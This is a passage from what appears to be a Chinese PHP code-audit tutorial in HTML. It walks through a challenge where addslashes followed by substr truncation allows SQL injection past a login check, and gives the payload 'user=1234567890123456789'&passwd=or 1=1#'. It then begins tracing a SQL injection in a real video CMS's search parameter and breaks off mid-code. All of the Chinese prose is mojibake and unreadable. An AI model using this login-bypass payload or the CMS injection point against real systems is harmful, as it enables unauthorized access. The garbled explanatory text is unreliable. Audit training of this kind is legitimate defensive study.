<a href="http://php.net/manual/zh/reserved.variables.request.php">REQUEST</a> å˜é‡é»˜è®¤æƒ…å†µä¸‹åŒ…å«äº† <strong>GET</strong> ï¼Œ<strong>POST</strong> å’Œ <strong>COOKIE</strong> çš„æ•°ç»„ã€‚åœ¨ <strong>php.ini</strong> é…ç½®æ–‡ä»¶ä¸­ï¼Œæœ‰ä¸€ä¸ªå‚æ•° <strong>variables_order</strong> ï¼Œè¿™å‚æ•°æœ‰ä»¥ä¸‹å¯é€‰é¡¹ç›®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">; variables_order</span><br><span class="line">;   Default Value: &quot;EGPCS&quot;</span><br><span class="line">;   Development Value: &quot;GPCS&quot;</span><br><span class="line">;   Production Value: &quot;GPCS&quot;</span><br></pre></td></tr></table></figure><p>è¿™äº›å­—æ¯åˆ†åˆ«å¯¹åº”çš„æ˜¯ <strong>E: Environment</strong> ï¼Œ<strong>G:Get</strong>ï¼Œ<strong>P:Post</strong>ï¼Œ<strong>C:Cookie</strong>ï¼Œ<strong>S:Server</strong>ã€‚è¿™äº›å­—æ¯çš„å‡ºç°é¡ºåºï¼Œè¡¨æ˜äº†æ•°æ®çš„åŠ è½½é¡ºåºã€‚è€Œ <strong>php.ini</strong> ä¸­è¿™ä¸ªå‚æ•°é»˜è®¤çš„é…ç½®æ˜¯ <strong>GPCS</strong> ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœä»¥ <strong>POST</strong> ã€ <strong>GET</strong> æ–¹å¼ä¼ å…¥ç›¸åŒçš„å˜é‡ï¼Œé‚£ä¹ˆç”¨ <strong>REQUEST</strong> è·å–è¯¥å˜é‡çš„å€¼å°†ä¸º <strong>POST</strong> è¯¥å˜é‡çš„å€¼ã€‚<br>æˆ‘ä»¬ä¸¾ä¸ªç®€å•çš„ä¾‹å­æ–¹ä¾¿å¤§å®¶ç†è§£ï¼š</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-12.png"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„ <strong>post</strong> æ–¹å¼ä¼ å…¥çš„æ•°æ®è¦†ç›–äº† <strong>get</strong> æ–¹å¼ä¼ å…¥çš„æ•°æ®ï¼Œå› æ­¤è¿™é‡Œæœ€åçš„payloadå¦‚ä¸‹ï¼š</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-13.png"></p><p>å‚è€ƒæ–‡ç« <br><a href="https://github.com/CHYbeta/Code-Audit-Challenges/blob/master/php/challenge-50.md">Code-Audit-Challenges</a></p><h2 id="Day-13-Turkey-Baster"><a href="#Day-13-Turkey-Baster" class="headerlink" title="Day 13 - Turkey Baster"></a>Day 13 - Turkey Baster</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoginManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$em</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;em = <span class="title class_">DoctrineManager</span>::<span class="title function_ invoke__">getEntityManager</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user = <span class="variable">$user</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValid</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">sanitizeInput</span>(<span class="variable">$this</span>-&gt;user);</span><br><span class="line">        <span class="variable">$pass</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">sanitizeInput</span>(<span class="variable">$this</span>-&gt;password);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$queryBuilder</span> = <span class="variable language_">$this</span>-&gt;em-&gt;<span class="title function_ invoke__">createQueryBuilder</span>()</span><br><span class="line">            -&gt;<span class="title function_ invoke__">select</span>(<span class="string">&quot;COUNT(p)&quot;</span>)</span><br><span class="line">            -&gt;<span class="keyword">from</span>(<span class="string">&quot;User&quot;</span>, <span class="string">&quot;u&quot;</span>)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">where</span>(<span class="string">&quot;user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;&quot;</span>);</span><br><span class="line">        <span class="variable">$query</span> = <span class="variable">$queryBuilder</span>-&gt;<span class="title function_ invoke__">getQuery</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">boolval</span>(<span class="variable">$query</span>-&gt;<span class="title function_ invoke__">getSingleScalarResult</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizeInput</span>(<span class="params"><span class="variable">$input</span>, <span class="variable">$length</span> = <span class="number">20</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$input</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$input</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$input</span>) &gt; <span class="variable">$length</span>) &#123;</span><br><span class="line">            <span class="variable">$input</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$input</span>, <span class="number">0</span>, <span class="variable">$length</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$auth</span> = <span class="keyword">new</span> <span class="title class_">LoginManager</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$auth</span>-&gt;<span class="title function_ invoke__">isValid</span>()) &#123;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€é“å…¸å‹çš„ç”¨æˆ·ç™»å½•ç¨‹åºï¼Œä»ä»£ç æ¥çœ‹ï¼Œè€ƒå¯Ÿçš„åº”è¯¥æ˜¯é€šè¿‡ <strong>SQLæ³¨å…¥</strong> ç»•è¿‡ç™»é™†éªŒè¯ã€‚ä»£ç  <strong>ç¬¬33è¡Œ</strong> ï¼Œé€šè¿‡ <strong>POST</strong> æ–¹å¼ä¼ å…¥ <strong>user</strong> å’Œ <strong>passwd</strong> ä¸¤ä¸ªå‚æ•°ï¼Œé€šè¿‡ <strong>isValid()</strong> æ¥åˆ¤æ–­ç™»é™†æ˜¯å¦åˆæ³•ã€‚æˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹ <strong>isValid()</strong> è¿™ä¸ªå‡½æ•°ï¼Œè¯¥å‡½æ•°ä¸»è¦åŠŸèƒ½ä»£ç åœ¨ <strong>ç¬¬12è¡Œ-ç¬¬22è¡Œ</strong> ï¼Œæˆ‘ä»¬çœ‹åˆ° <strong>13è¡Œ</strong> å’Œ <strong>14è¡Œ</strong> è°ƒç”¨ <strong>sanitizeInput()</strong> é’ˆå¯¹ <strong>user</strong> å’Œ <strong>password</strong> è¿›è¡Œç›¸å…³å¤„ç†ã€‚</p><p>è·Ÿè¿›ä¸€ä¸‹ <strong>sanitizeInput()</strong> ï¼Œä¸»è¦åŠŸèƒ½ä»£ç åœ¨ <strong>ç¬¬24è¡Œ-ç¬¬29è¡Œ</strong> ï¼Œè¿™é‡Œé’ˆå¯¹è¾“å…¥çš„æ•°æ®è°ƒç”¨ <strong>addslashes</strong> å‡½æ•°è¿›è¡Œå¤„ç†ï¼Œç„¶åå†é’ˆå¯¹å¤„ç†åçš„å†…å®¹è¿›è¡Œé•¿åº¦çš„åˆ¤æ–­ï¼Œå¦‚æœé•¿åº¦å¤§äº20ï¼Œå°±åªæˆªå–å‰20ä¸ªå­—ç¬¦ã€‚ <strong>addslashes</strong> å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š</p><blockquote><p><a href="http://php.net/manual/zh/function.addslashes.php">addslashes</a> â€” ä½¿ç”¨åæ–œçº¿å¼•ç”¨å­—ç¬¦ä¸²</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">addslashes</span> ( <span class="keyword">string</span> <span class="variable">$str</span> )</span><br></pre></td></tr></table></figure><p>ä½œç”¨ï¼šåœ¨å•å¼•å·ï¼ˆâ€™ï¼‰ã€åŒå¼•å·ï¼ˆâ€ï¼‰ã€åæ–œçº¿ï¼ˆ\ï¼‰ä¸ NULï¼ˆ <strong>NULL</strong> å­—ç¬¦ï¼‰å­—ç¬¦ä¹‹å‰åŠ ä¸Šåæ–œçº¿ã€‚</p></blockquote><p>æˆ‘ä»¬æ¥çœ‹ä¸ªä¾‹å­ï¼š<br><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-14.png"></p><p>é‚£è¿™é¢˜å·²ç»è¿‡æ»¤äº†å•å¼•å·ï¼Œæ­£å¸¸æƒ…å†µä¸‹æ˜¯æ²¡æœ‰æ³¨å…¥äº†ï¼Œé‚£ä¸ºä»€ä¹ˆè¿˜èƒ½å¯¼è‡´æ³¨å…¥äº†ï¼ŒåŸå› å®é™…ä¸Šå‡ºåœ¨äº† <strong>substr</strong> å‡½æ•°ï¼Œæˆ‘ä»¬å…ˆçœ‹è¿™ä¸ªå‡½æ•°çš„å®šä¹‰ï¼š</p><blockquote><p><a href="http://php.net/manual/zh/function.substr.php">substr</a> â€” è¿”å›å­—ç¬¦ä¸²çš„å­ä¸²</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">substr</span> ( <span class="keyword">string</span> <span class="variable">$string</span> , <span class="keyword">int</span> <span class="variable">$start</span> [, <span class="keyword">int</span> <span class="variable">$length</span> ] )</span><br></pre></td></tr></table></figure><p>ä½œç”¨ï¼šè¿”å›å­—ç¬¦ä¸² <code>string</code> ç”± <code>start</code> å’Œ <code>length</code> å‚æ•°æŒ‡å®šçš„å­å­—ç¬¦ä¸²ã€‚ </p></blockquote><p>æˆ‘ä»¬æ¥çœ‹ä¸ªä¾‹å­ï¼š</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-15.png"></p><p>é‚£ä¹ˆå†å›åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬çŸ¥é“åæ–œæ å¯ä»¥å–æ¶ˆç‰¹æ®Šå­—ç¬¦çš„ç”¨æ³•ï¼Œè€Œæ³¨å…¥æƒ³è¦é€šè¿‡å•å¼•å·é—­åˆï¼Œåœ¨è¿™é“é¢˜é‡ŒåŠ¿å¿…ä¼šå¼•å…¥åæ–œæ ã€‚æ‰€ä»¥æˆ‘ä»¬èƒ½å¦åœ¨åæ–œæ ä¸å•å¼•å·ä¹‹é—´æˆªæ–­æ‰ï¼Œåªç•™ä¸€ä¸ªåæ–œæ å‘¢ï¼Ÿç­”æ¡ˆæ˜¯å¯ä»¥ï¼Œæˆ‘ä»¬çœ‹ä¸ªä»¥ä¸‹è¿™ä¸ªä¾‹å­ã€‚</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-16.png"></p><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ç›´æ¥ä½¿ç”¨é¢˜ç›®ä»£ç ä¸­çš„è¿‡æ»¤ä»£ç ï¼Œå¹¶ä¸”æˆåŠŸåœ¨åæ–œæ å’Œå•å¼•å·ä¹‹é—´æˆªæ–­äº†ï¼Œé‚£æˆ‘ä»¬æŠŠè¿™ä¸ªpayloadå¸¦å…¥åˆ°é¢˜ç›®ä»£ç ä¸­ï¼Œæ‹¼æ¥ä¸€ä¸‹ <strong>ç¬¬17è¡Œ-ç¬¬19è¡Œ</strong> ä»£ç ä¸­çš„sqlè¯­å¥ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="title function_ invoke__">count</span>(p) <span class="keyword">from</span> user u where user = <span class="string">&#x27;1234567890123456789\&#x27; AND password = &#x27;</span><span class="variable">$pass</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„sqlè¯­å¥ç”±äºåæ–œæ çš„åŸå› ï¼Œ <strong>user &#x3D; â€˜1234567890123456789\â€˜</strong> æœ€åè¿™ä¸ªå•å¼•å·ä¾¿å¤±å»äº†å®ƒçš„ä½œç”¨ã€‚è¿™é‡Œæˆ‘ä»¬è®© <strong>pass&#x3D;or 1&#x3D;1#</strong> ï¼Œé‚£ä¹ˆæœ€åçš„sqlè¯­å¥å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="title function_ invoke__">count</span>(p) <span class="keyword">from</span> user where user = <span class="string">&#x27;1234567890123456789\&#x27; AND password = &#x27;</span><span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#&#x27;</span></span><br></pre></td></tr></table></figure><p>è¿™æ—¶å€™åœ¨æ­¤SQLè¯­å¥ä¸­ï¼Œ <strong>user</strong> å€¼ä¸º <strong>1234567890123456789\â€˜ AND password &#x3D;</strong>  ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä¿è¯å¸¦å…¥æ•°æ®åº“æ‰§è¡Œçš„ç»“æœä¸º <strong>True</strong> ï¼Œç„¶åå°±èƒ½å¤Ÿé¡ºåˆ©åœ°é€šè¿‡éªŒè¯ã€‚</p><p>æ‰€ä»¥è¿™é¢˜æœ€åçš„ <strong>payload</strong> å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=<span class="number">1234567890123456789</span><span class="string">&#x27;&amp;passwd=or 1=1#</span></span><br></pre></td></tr></table></figure><h3 id="å®ä¾‹åˆ†æ-1"><a href="#å®ä¾‹åˆ†æ-1" class="headerlink" title="å®ä¾‹åˆ†æ"></a>å®ä¾‹åˆ†æ</h3><p>è¿™é‡Œçš„å®ä¾‹åˆ†æï¼Œæˆ‘ä»¬é€‰æ‹© <strong>è‹¹æœCMSè§†é¢‘åˆ†äº«ç¨‹åº 8.0</strong> è¿›è¡Œç›¸å…³æ¼æ´åˆ†æã€‚æ¼æ´çš„ä½ç½®æ˜¯åœ¨ <strong>inc\common\template.php</strong> ï¼Œæˆ‘ä»¬å…ˆçœ‹çœ‹ç›¸å…³ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$lp</span>[<span class="string">&#x27;wd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$where</span> .= <span class="string">&#x27; AND ( instr(a_name,\&#x27;&#x27;</span>.<span class="variable">$lp</span>[<span class="string">&#x27;wd&#x27;</span>].<span class="string">&#x27;\&#x27;)&gt;0 or instr(a_subname,\&#x27;&#x27;</span>.<span class="variable">$lp</span>[<span class="string">&#x27;wd&#x27;</span>].<span class="string">&#x27;\&#x27;)&gt;0 ) &#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä»£ç çš„ <strong>ç¬¬ä¸‰è¡Œ-ç¬¬å››è¡Œ</strong> ä½ç½®ï¼Œ <strong>$lp[â€˜wdâ€™]</strong> å˜é‡ä½ç½®å­˜åœ¨å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œå¾ˆæ˜æ˜¾å­˜åœ¨ <strong>sqlæ³¨å…¥</strong> ï¼Œä½†æ˜¯è¿™ä¸ªcmså…·æœ‰ä¸€äº›é€šç”¨çš„æ³¨å…¥é˜²æŠ¤ï¼Œæ‰€ä»¥æˆ‘ä»¬ä»å¤´å¼€å§‹ä¸€æ­¥æ­¥çš„çœ‹ã€‚</p><p>é¦–å…ˆåœ¨ <strong>inc\module\vod.php</strong> æ–‡ä»¶ä¸­çš„ï¼Œæˆ‘ä»¬çœ‹åˆ° <strong>ç¬¬ä¸€è¡Œ</strong> ä»£ç å½“ <strong>$method&#x3D;search</strong> æˆç«‹çš„æ—¶å€™ï¼Œè¿›å…¥äº† <strong>ç¬¬3è¡Œ</strong> ä¸­çš„ <strong>be(â€œallâ€, â€œwdâ€)</strong> è·å–è¯·æ±‚ä¸­ <strong>wd</strong> å‚æ•°çš„å€¼ï¼Œå¹¶ä¸”ä½¿ç”¨ <strong>chkSql()</strong> å‡½æ•°é’ˆå¯¹ <strong>wd</strong> å‚æ•°çš„å€¼è¿›è¡Œå¤„ç†ã€‚éƒ¨åˆ†å…³é”®ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>(<span class="variable">$method</span>==<span class="string">&#x27;search&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$tpl</span>-&gt;C[<span class="string">&quot;siteaid&quot;</span>] = <span class="number">15</span>;</span><br><span class="line">    <span class="variable">$wd</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">be</span>(<span class="string">&quot;all&quot;</span>, <span class="string">&quot;wd&quot;</span>)); <span class="variable">$wd</span> = <span class="title function_ invoke__">chkSql</span>(<span class="variable">$wd</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$wd</span>))&#123; <span class="variable">$tpl</span>-&gt;P[<span class="string">&quot;wd&quot;</span>] = <span class="variable">$wd</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›ä¸€ä¸‹ <strong>be()</strong> å‡½æ•°ï¼Œå…¶ä½ç½®åœ¨ <strong>inc\common\function.php</strong> æ–‡ä»¶ä¸­ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">be</span>(<span class="params"><span class="variable">$mode</span>,<span class="variable">$key</span>,<span class="variable">$sp</span>=<span class="string">&#x27;,&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;magic_quotes_runtime&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$magicq</span>= <span class="title function_ invoke__">get_magic_quotes_gpc</span>();</span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$mode</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;post&#x27;</span>:</span><br><span class="line">            <span class="variable">$res</span>=<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$key</span>]) ? <span class="variable">$magicq</span>?<span class="variable">$_POST</span>[<span class="variable">$key</span>] :<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="variable">$key</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;get&#x27;</span>:</span><br><span class="line">            <span class="variable">$res</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="variable">$key</span>]) ? <span class="variable">$magicq</span>?<span class="variable">$_GET</span>[<span class="variable">$key</span>] :<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="variable">$key</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;arr&#x27;</span>:</span><br><span class="line">            <span class="variable">$arr</span> =<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$key</span>]) ? <span class="variable">$_POST</span>[<span class="variable">$key</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$arr</span>==<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">                <span class="variable">$value</span>=<span class="string">&quot;0&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">                    <span class="variable">$res</span>=<span class="title function_ invoke__">implode</span>(<span class="variable">$sp</span>,<span class="variable">$arr</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$res</span>=<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="variable">$key</span>]) ? <span class="variable">$magicq</span>? <span class="variable">$_REQUEST</span>[<span class="variable">$key</span>] : <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_REQUEST</span>[<span class="variable">$key</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™éƒ¨åˆ†ä»£ç çš„ä½œç”¨å°±æ˜¯å¯¹ <strong>GETï¼ŒPOSTï¼ŒREQUEST</strong> æ¥æ”¶åˆ°çš„å‚æ•°è¿›è¡Œ <strong>addslashes</strong> çš„è½¬ä¹‰å¤„ç†ã€‚æ ¹æ®å‰é¢é’ˆå¯¹ <strong>be(â€œallâ€, â€œwdâ€)</strong> çš„åˆ†æï¼Œæˆ‘ä»¬çŸ¥é“ <strong>wd</strong> å‚æ•°çš„å€¼æ˜¯é€šè¿‡ <strong>REQUEST</strong> æ–¹å¼æ¥æ”¶ï¼Œå¹¶ä½¿ç”¨ <strong>addslashes</strong> å‡½æ•°è¿›è¡Œè½¬ä¹‰å¤„ç†ã€‚å†å›åˆ° <strong>inc\module\vod.php</strong> æ–‡ä»¶ä¸­çš„ï¼Œæˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹ <strong>chkSql()</strong> å‡½æ•°ï¼Œè¯¥å‡½æ•°ä½ç½®åœ¨ <strong>inc\common\360_safe3.php</strong> æ–‡ä»¶ä¸­ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">chkSql</span>(<span class="params"><span class="variable">$s</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$getfilter</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$d</span>=<span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$d</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span>==<span class="variable">$d</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$d</span> = <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">StopAttack</span>(<span class="number">1</span>,<span class="variable">$s</span>,<span class="variable">$getfilter</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">htmlEncode</span>(<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ†æä¸€ä¸‹è¿™éƒ¨åˆ†ä»£ç çš„ä½œç”¨ï¼Œå…¶å®å°±æ˜¯åœ¨ <strong>ç¬¬8è¡Œ-ç¬¬12è¡Œ</strong> é’ˆå¯¹æ¥æ”¶åˆ°çš„çš„å˜é‡è¿›è¡Œå¾ªç¯çš„ <strong>urldecode</strong> ï¼ˆä¹Ÿå°±æ˜¯urlè§£ç ï¼‰åŠ¨ä½œï¼Œç„¶ååœ¨ <strong>ç¬¬15è¡Œ</strong> ï¼Œä½¿ç”¨ <strong>StopAttack</strong> å‡½æ•°è§£ç åçš„æ•°æ®è¿›è¡Œå¤„ç†ï¼Œæœ€åå°†å¤„ç†åçš„æ•°æ®é€šè¿‡ <strong>htmlEncode</strong> æ–¹æ³•è¿›è¡Œæœ€åçš„å¤„ç†ï¼Œç„¶åè¿”å›å¤„ç†ä¹‹åçš„å€¼ã€‚</p><p>æˆ‘ä»¬å…ˆè·Ÿè¿›ä¸€ä¸‹ <strong>StopAttack</strong> å‡½æ•°ï¼Œè¯¥å‡½æ•°ä½ç½®åœ¨ <strong>inc\common\360_safe3.php</strong> æ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬æˆªå–éƒ¨åˆ†ç›¸å…³ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">StopAttack</span>(<span class="params"><span class="variable">$StrFiltKey</span>,<span class="variable">$StrFiltValue</span>,<span class="variable">$ArrFiltReq</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$errmsg</span> = <span class="string">&quot;&lt;div style=\&quot;position:fixed;top:0px;width:100%;height:100%;background-color:white;color:green;font-weight:bold;border-bottom:5px solid #999;\&quot;&gt;&lt;br&gt;æ‚¨çš„æäº¤å¸¦æœ‰ä¸åˆæ³•å‚æ•°ï¼Œè°¢è°¢åˆä½œ!&lt;br&gt;æ“ä½œIP: &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>].<span class="string">&quot;&lt;br&gt;æ“ä½œæ—¶é—´: &quot;</span>.<span class="title function_ invoke__">strftime</span>(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>).<span class="string">&quot;&lt;br&gt;æ“ä½œé¡µé¢:&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&quot;PHP_SELF&quot;</span>].<span 